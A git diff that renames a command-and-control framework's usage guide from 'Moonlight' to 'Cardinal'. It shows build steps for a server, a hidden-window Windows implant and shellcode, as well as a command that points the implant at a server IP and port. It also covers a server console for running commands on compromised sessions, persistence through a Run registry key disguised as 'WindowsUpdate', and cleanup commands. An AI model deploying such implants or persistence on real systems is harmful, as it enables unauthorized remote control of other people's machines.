@@ -1,4 +1,4 @@
-# Usage Guide - Moonlight C2 Framework
+# Usage Guide - Cardinal C2 Framework
 
 ## Table of Contents
 
@@ -17,7 +17,7 @@
 
 ### Prerequisites
 
-Before building Moonlight C2, ensure you have:
+Before building Cardinal C2, ensure you have:
 
 1. **MinGW-w64** or **Microsoft Visual C++**
    - Download: https://mingw-w64.org/
@@ -69,7 +69,7 @@ If you prefer to build components individually:
 
 ```powershell
 cd server
-gcc -Wall -O2 -DWIN32 -D_WIN32_WINNT=0x0500 main.c -o moonlight-server.exe -lws2_32
+gcc -Wall -O2 -DWIN32 -D_WIN32_WINNT=0x0500 main.c -o Cardinal-server.exe -lws2_32
 cd ..
 ```
 
@@ -77,7 +77,7 @@ cd ..
 
 ```powershell
 cd client
-gcc -Wall -O2 -DWIN32 -D_WIN32_WINNT=0x0500 -mwindows implant.c -o moonlight-implant.exe -lws2_32 -ladvapi32 -luser32
+gcc -Wall -O2 -DWIN32 -D_WIN32_WINNT=0x0500 -mwindows implant.c -o Cardinal-implant.exe -lws2_32 -ladvapi32 -luser32
 nasm -f bin -o shellcode.bin shellcode.asm
 cd ..
 ```
@@ -96,7 +96,7 @@ cd ..
 
 ```powershell
 cd gui
-dotnet build MoonlightC2.csproj -c Release -o ..\bin\gui
+dotnet build CardinalC2.csproj -c Release -o ..\bin\gui
 cd ..
 ```
 
@@ -112,14 +112,14 @@ The C2 server is a console application that manages implant connections.
 
 ```powershell
 # Start on default port 4444
-.\bin\moonlight-server.exe
+.\bin\Cardinal-server.exe
 ```
 
 **Custom Port:**
 
 ```powershell
 # Start on custom port
-.\bin\moonlight-server.exe 8080
+.\bin\Cardinal-server.exe 8080
 ```
 
 ### Server Console Commands
@@ -128,12 +128,12 @@ Once the server is running, you can use these commands:
 
 | Command | Description | Example |
 |---------|-------------|---------|
-| `sessions` | List all active sessions | `moonlight> sessions` |
-| `exec <id> <cmd>` | Execute command on a session | `moonlight> exec 0 ipconfig` |
-| `kill <id>` | Terminate a session | `moonlight> kill 0` |
-| `broadcast <msg>` | Send to all sessions | `moonlight> broadcast test` |
-| `help` | Show available commands | `moonlight> help` |
-| `exit` | Shutdown the server | `moonlight> exit` |
+| `sessions` | List all active sessions | `Cardinal> sessions` |
+| `exec <id> <cmd>` | Execute command on a session | `Cardinal> exec 0 ipconfig` |
+| `kill <id>` | Terminate a session | `Cardinal> kill 0` |
+| `broadcast <msg>` | Send to all sessions | `Cardinal> broadcast test` |
+| `help` | Show available commands | `Cardinal> help` |
+| `exit` | Shutdown the server | `Cardinal> exit` |
 
 ### Server Output Example
 
@@ -152,12 +152,12 @@ Once the server is running, you can use these commands:
 Run the implant on the target system:
 
 ```cmd
-moonlight-implant.exe <server_ip> <port>
+Cardinal-implant.exe <server_ip> <port>
 ```
 
 Example:
 ```cmd
-moonlight-implant.exe 192.168.1.10 4444
+Cardinal-implant.exe 192.168.1.10 4444
 ```
 
 ### Stealth Deployment Options
@@ -190,7 +190,7 @@ The implant can install itself via the `PERSIST` command from the server.
 ### Launching the GUI
 
 ```powershell
-.\bin\gui\MoonlightC2.exe
+.\bin\gui\CardinalC2.exe
 ```
 
 ### GUI Components
@@ -488,10 +488,10 @@ After testing:
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f
 
 # Kill implant process
-taskkill /F /IM moonlight-implant.exe
+taskkill /F /IM Cardinal-implant.exe
 
 # Remove files
-del C:\Temp\moonlight-implant.exe
+del C:\Temp\Cardinal-implant.exe
 ```
 
 ---
